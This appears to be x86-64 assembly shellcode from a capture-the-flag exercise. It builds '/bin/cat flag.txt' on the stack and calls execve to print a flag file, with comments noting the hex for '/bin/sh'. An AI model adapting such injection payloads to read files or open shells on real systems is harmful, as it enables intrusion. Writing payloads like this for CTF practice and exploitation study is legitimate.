BITS 64

; cat in hex reversed = '746163'
; cat file.txt in hex reversed = '7478742e67616c6620746163'
; push into stack
; 1st part = 0x7478742e67616c66   ; flag.txt
; 2nd part = 0x7461632f6e69622f    ; /bin/cat
; /bin/sh  = 0x68732f6e69622f

section .text

    global _start

    _start:
        xor rsi, rsi
        push rsi
        mov rax, 0x7478742e67616c66   ; flag.txt
        push rax
        mov r15, rsp
        push rsi

        mov rax, 0x7461632f6e69622f ; /bin/cat
        push rax

        mov rdi, rsp
        push rsi

        mov rbx, rsp

        push r15
        push rdi
        mov rsi, rsp

        mov rax, 59
        syscall

        xor rdi, rdi
        mov rax, 60
        syscall
